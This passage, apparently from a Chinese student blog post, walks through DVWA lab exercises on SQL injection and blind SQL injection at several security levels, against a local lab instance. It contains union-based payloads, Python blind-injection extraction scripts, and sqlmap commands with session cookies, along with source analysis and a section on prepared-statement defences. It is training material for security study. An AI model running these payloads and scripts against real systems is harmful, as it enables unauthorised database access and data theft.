+mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p><code>mysqli_real_escape_string()</code> 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>所以导致了单引号被转义的结果</p>
+<h4 id="sqlmap注入-1"><a href="#sqlmap注入-1" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><p>因为是post注入，所以需要抓取数据包保存下来。</p>
+<p>如图，可以将其保存在sqlmap.py的路径下</p>
+<p><img src="https://i.loli.net/2020/11/06/hySBmFe4zoTgvNq.png" srcset="/img/loading.gif" alt="sqlm-5.png"></p>
+<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><div class="hljs"><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch --dbs
+python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa --tables
+python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag --<span class="hljs-attribute">columns</span>
+python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag -C fl4g --dump</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/zaHYUItEZlPFh4e.png" srcset="/img/loading.gif" alt="sqlm-6.png"></p>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击</p>
+<p><img src="https://i.loli.net/2020/11/06/kAdfp8SFCroTlID.png" srcset="/img/loading.gif" alt="sqlh-1.png"></p>
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p>直接使用low级别的payload：</p>
+<div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span>
+<span class="hljs-number">1</span><span class="hljs-string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>flag<span class="hljs-string">' #</span>
+<span class="hljs-string">1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre></div>
+
+
+
+<p><img src="https://i.loli.net/2020/11/06/4sjoOwYKa3lW6S1.png" srcset="/img/loading.gif" alt="sqlh-2.png"></p>
+<p><img src="https://i.loli.net/2020/11/06/vXlbSQk1cn2JTAB.png" srcset="/img/loading.gif" alt="sqlh-3.png"></p>
+<p><img src="https://i.loli.net/2020/11/06/IohbvktCq2NpyDa.png" srcset="/img/loading.gif" alt="sqlh-4.png"></p>
+<p>源码分析</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_SESSION [ <span class="hljs-string">'id'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Get input</span>
+    $id = $_SESSION[ <span class="hljs-string">'id'</span> ];
+
+    <span class="hljs-comment">// Check database</span>
+    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );
+
+    <span class="hljs-comment">// Get results</span>
+    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;
+        <span class="hljs-comment">// Get values</span>
+        $first = $row[<span class="hljs-string">"first_name"</span>];
+        $last  = $row[<span class="hljs-string">"last_name"</span>];
+
+        <span class="hljs-comment">// Feedback for end user</span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;
+    &#125;
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);        
+&#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<div class="hljs"><pre><code class="hljs sql">$query  = "<span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'$id'</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">1</span>;";</code></pre></div>
+
+<p>存在注入的语句只是在low级别的基础上加上了<code>Limit</code>限制了回显的行数，但是使用low级别的注入语句时会直接把<code>Limit 1</code>注释掉，所以完全与low级别一样。</p>
+<h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><p>盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
+<h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><h4 id="手工加脚本"><a href="#手工加脚本" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>查询成功返回的语句：User ID exists in the database.</p>
+<p>查询失败返回的语句：User ID is MISSING from the database.</p>
+<p>这样就可以利用提示信息确定，我们所查询的语句是否正确</p>
+<p>首先确定盲注的语句</p>
+<p>通过下面的测试，说明ascii函数是可以使用的，写注入的脚本，二分法更快点。</p>
+<div class="hljs"><pre><code class="hljs routeros">1<span class="hljs-string">' and ascii(substring(database(),1,1))&gt;50 #</span>
+<span class="hljs-string">提示 ：User ID exists in the database.</span>
+<span class="hljs-string">1'</span> <span class="hljs-keyword">and</span> ascii(substring(database(),1,1))&lt;50 #
+提示：<span class="hljs-built_in"> User </span>ID is MISSING <span class="hljs-keyword">from</span> the database.</code></pre></div>
+
+
+
+
+
+<p><img src="/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201026201632666.png" srcset="/img/loading.gif" alt="image-20201026201632666"></p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
+<span class="hljs-comment">#@Time : 2020/10/26 17:29</span>
+<span class="hljs-comment">#@Author : sunzy</span>
+<span class="hljs-comment">#@File : dvwa.py</span>
+<span class="hljs-comment"># 二分法盲注</span>
+<span class="hljs-keyword">import</span> requests
+url = <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/?id="</span>
+
+header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span>&#125;
+flag = <span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    left = <span class="hljs-number">32</span>
+    right = <span class="hljs-number">128</span>
+    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span>(left &lt; right):
+        <span class="hljs-comment">#获取数据库名</span>
+        <span class="hljs-comment">#payload = "1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>
+        <span class="hljs-comment">#获取表名</span>
+        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
+        <span class="hljs-comment">#获取列名</span>
+        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
+        <span class="hljs-comment">#获取flag</span>
+        payload = <span class="hljs-string">"1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)
+        url1 =url+payload+<span class="hljs-string">"&amp;Submit=Submit#"</span>
+        response = requests.post(url1,headers= header)
+        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:
+            left = mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            right = mid
+        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
+    flag = flag + chr(mid)
+print(flag)</code></pre></div>
+
+<p>1.首先获取表名</p>
+<p>使用payload:</p>
+<div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(table_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/YfAIjUFeiEodHML.png" srcset="/img/loading.gif" alt="bsqll-1.png"></p>
+<p>2.获取列名</p>
+<p>使用payload</p>
+<div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(column_name),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/AoaD41sLJ5wmbeG.png" srcset="/img/loading.gif" alt="bsqll-2.png"></p>
+<p>3.获取flag</p>
+<p>使用payload</p>
+<div class="hljs"><pre><code class="hljs sql">payload = "1' and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substring</span>(<span class="hljs-keyword">group_concat</span>(fl4g),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">having</span> a&gt;&#123;<span class="hljs-number">1</span>&#125;)%<span class="hljs-number">23</span><span class="hljs-string">".format(i,mid)</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/06/9taguv2jR6cU5VD.png" srcset="/img/loading.gif" alt="bsqll-3.png"></p>
+<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=low; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>  -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div>
+
+
+
+<h3 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h3><h4 id="手工加脚本-1"><a href="#手工加脚本-1" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>与low级别不同，中级别提交数据是post类型，所以需要抓包后再提交。</p>
+<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> length(database())=4 #&amp;<span class="hljs-attribute">Submit</span>=Submit
+提示User ID exists <span class="hljs-keyword">in</span> the database.
+<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> length(database())=5 #&amp;<span class="hljs-attribute">Submit</span>=Submit
+User ID is MISSING <span class="hljs-keyword">from</span> the database</code></pre></div>
+
+<p>所以思路还是与low级别一样，只不过脚本中提交数据的方式改为POST类型</p>
+<p>直接上脚本</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+url = <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span>
+
+header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>&#125;
+flag = <span class="hljs-string">""</span>
+t = <span class="hljs-string">""</span>
+sum=<span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    left = <span class="hljs-number">32</span>
+    right = <span class="hljs-number">128</span>
+    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span>(left &lt; right):
+        <span class="hljs-comment">#payload = "1 and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>
+        <span class="hljs-comment">#payload = "1 and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
+        <span class="hljs-comment">#payload = "1 and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
+        payload = <span class="hljs-string">"1 and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)
+        data = &#123;<span class="hljs-string">'id'</span>: payload, <span class="hljs-string">'Submit'</span>: <span class="hljs-string">'Submit'</span>&#125;
+
+        response = requests.post(url,headers = header,data=data)
+        t = response.text
+        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:
+            left = mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            right = mid
+        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
+    print(mid)
+    flag = flag + chr(mid)
+print(flag)</code></pre></div>
+
+<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--dbs</span>
+
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa <span class="hljs-params">--tables</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa -T flag <span class="hljs-params">--columns</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> <span class="hljs-params">--data</span> <span class="hljs-string">"id=1&amp;Submit=Submit"</span> -p <span class="hljs-string">"id"</span> <span class="hljs-params">--cookie</span> <span class="hljs-string">"security=medium; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre></div>
+
+
+
+<p><img src="https://i.loli.net/2020/11/12/uI6w2bnCjsJfQHG.png" srcset="/img/loading.gif" alt="bsqlh-1.png"></p>
+<p>sqlmap中给了三种注入方式，并且给出了payload，可以基于给出的提示继续做下去</p>
+<p>下面是sqlmap爆出的flag。</p>
+<p><img src="https://i.loli.net/2020/11/12/ZdwnMI6vhbRCikc.png" srcset="/img/loading.gif" alt="bsqlh-2.png"></p>
+<p>源码分析</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ]  ) ) &#123; 
+    <span class="hljs-comment">// Get input </span>
+    $id = $_POST[ <span class="hljs-string">'id'</span> ]; 
+    $id = mysql_real_escape_string( $id ); 
+
+    <span class="hljs-comment">// Check database </span>
+    $getid  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; 
+    $result = mysql_query( $getid ); <span class="hljs-comment">// Removed 'or die' to suppress mysql errors </span>
+
+    <span class="hljs-comment">// Get results </span>
+    $num = @mysql_numrows( $result ); <span class="hljs-comment">// The '@' character suppresses errors </span>
+    <span class="hljs-keyword">if</span>( $num &gt; <span class="hljs-number">0</span> ) &#123; 
+        <span class="hljs-comment">// Feedback for end user </span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; 
+    &#125; 
+    <span class="hljs-keyword">else</span> &#123; 
+        <span class="hljs-comment">// Feedback for end user </span>
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; 
+    &#125; 
+
+    <span class="hljs-comment">//mysql_close(); </span>
+&#125; 
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p><strong>mysql_real_escape_string()</strong> 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>&#39;</code>, <code>&quot;</code> 和 <code>\x1a</code>.</p>
+<p>本质上跟low级别的没有太大的区别，只是将一些特殊字符转义，但是我们注入时没有用到这些字符，所以注入语句基本和low级别一样</p>
+<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-string">GET</span> <span class="hljs-string">/dvwa/vulnerabilities/sqli_blind/</span> <span class="hljs-string">HTTP/1.1</span>
+<span class="hljs-attr">Host:</span> <span class="hljs-number">10.5</span><span class="hljs-number">.8</span><span class="hljs-number">.66</span>
+<span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64;</span> <span class="hljs-string">rv:82.0)</span> <span class="hljs-string">Gecko/20100101</span> <span class="hljs-string">Firefox/82.0</span>
+<span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="hljs-attr">Accept-Language:</span> <span class="hljs-string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="hljs-attr">Referer:</span> <span class="hljs-string">http://10.5.8.66/dvwa/vulnerabilities/sqli/</span>
+<span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span>
+<span class="hljs-attr">Cookie:</span> <span class="hljs-string">id=1;</span> <span class="hljs-string">security=high;</span> <span class="hljs-string">PHPSESSID=e31dkassqtg9388l159fn72ac1</span>
+<span class="hljs-attr">Upgrade-Insecure-Requests:</span> <span class="hljs-number">1</span>
+<span class="hljs-attr">Cache-Control:</span> <span class="hljs-string">max-age=0</span></code></pre></div>
+
+<p>抓包后可以发现提交的参数<code>id</code>在cookie中，所以与中级别的方法不一样了，但是还是可以使用sqlmap注入。</p>
+<h4 id="手工加脚本-2"><a href="#手工加脚本-2" class="headerlink" title="手工加脚本"></a>手工加脚本</h4><p>通过手工测试发现是字符型注入，与low级别的脚本大同小异，只是将注入的位置改到了cookie的位置</p>
+<p><img src="https://i.loli.net/2020/11/12/I257FMGp9VNfiac.png" srcset="/img/loading.gif" alt="bsqlh-3.png"></p>
+<p><img src="https://i.loli.net/2020/11/12/TtyDpsOmZEfBbVe.png" srcset="/img/loading.gif" alt="bsqlh-4.png"></p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+url = <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span>
+t=<span class="hljs-string">""</span>
+flag = <span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    left = <span class="hljs-number">32</span>
+    right = <span class="hljs-number">128</span>
+    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span>(left &lt; right):
+        <span class="hljs-comment">#payload = "1' and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23".format(i,mid)</span>
+        payload = <span class="hljs-string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23"</span>.format(i,mid)
+        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='flag' having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
+        <span class="hljs-comment">#payload = "1' and (select ascii(substring(group_concat(fl4g),&#123;0&#125;,1)) as a from flag having a&gt;&#123;1&#125;)%23".format(i,mid)</span>
+        id = payload
+        header = &#123;<span class="hljs-string">"Cookie"</span>: <span class="hljs-string">"id="</span>+payload+<span class="hljs-string">";"</span>+<span class="hljs-string">"security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span>&#125;
+        <span class="hljs-comment">#print(header)</span>
+        response = requests.post(url,headers = header)
+        t = response.text
+        <span class="hljs-keyword">if</span> <span class="hljs-string">"exists"</span> <span class="hljs-keyword">in</span> response.text:
+            left = mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            right = mid
+        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
+    print(mid)
+    <span class="hljs-comment">#print(t)</span>
+    flag = flag + chr(mid)
+print(flag)</code></pre></div>
+
+
+
+<h4 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa <span class="hljs-params">--tables</span> <span class="hljs-params">--batch</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag <span class="hljs-params">--columns</span> <span class="hljs-params">--batch</span>
+
+python2 sqlmap.py -u <span class="hljs-string">"http://10.5.8.66/dvwa/vulnerabilities/sqli_blind/"</span> -p <span class="hljs-string">"id"</span>  <span class="hljs-params">--cookie</span> <span class="hljs-string">"id=1; security=high; PHPSESSID=e31dkassqtg9388l159fn72ac1"</span> <span class="hljs-params">--level</span> 2 -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span> <span class="hljs-params">--batch</span></code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/12/jLdrQDiI9XlAZcU.png" srcset="/img/loading.gif" alt="bsqlh-5.png"></p>
+<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><p>通过查看impossible源码发现检测了id数据类型，使用了预编译绑定id变量，有效防止SQL注入，这些可以在以后编程中应用，以编写出更加安全的代码。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Submit'</span> ] ) ) &#123;
+    <span class="hljs-comment">// Check Anti-CSRF token</span>
+    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );
+
+    <span class="hljs-comment">// Get input</span>
+    $id = $_GET[ <span class="hljs-string">'id'</span> ];
+
+    <span class="hljs-comment">// Was a number entered?</span>
+    <span class="hljs-keyword">if</span>(is_numeric( $id )) &#123;   <span class="hljs-comment">//检测提交的数据是否为数字类型</span>
+        <span class="hljs-comment">// Check the database</span>
+        $data = $db-&gt;prepare( <span class="hljs-string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );<span class="hljs-comment">//预编译绑定了id变量</span>
+        $data-&gt;bindParam( <span class="hljs-string">':id'</span>, $id, PDO::PARAM_INT );
+        $data-&gt;execute();
+
+        <span class="hljs-comment">// Get results</span>
+        <span class="hljs-keyword">if</span>( $data-&gt;rowCount() == <span class="hljs-number">1</span> ) &#123;
+            <span class="hljs-comment">// Feedback for end user</span>
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;
+        &#125;
+        <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-comment">// User wasn't found, so the page wasn't!</span>
+            header( $_SERVER[ <span class="hljs-string">'SERVER_PROTOCOL'</span> ] . <span class="hljs-string">' 404 Not Found'</span> );
+
+            <span class="hljs-comment">// Feedback for end user</span>
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-comment">// Generate Anti-CSRF token</span>
+generateSessionToken();
+
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+
+
+<h2 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS (Reflected)"></a>XSS (Reflected)</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+header (<span class="hljs-string">"X-XSS-Protection: 0"</span>);
+
+<span class="hljs-comment">// Is there any input?</span>
+<span class="hljs-keyword">if</span>( array_key_exists( <span class="hljs-string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="hljs-string">'name'</span> ] != <span class="hljs-keyword">NULL</span> ) &#123;
+    <span class="hljs-comment">// Feedback for end user</span>
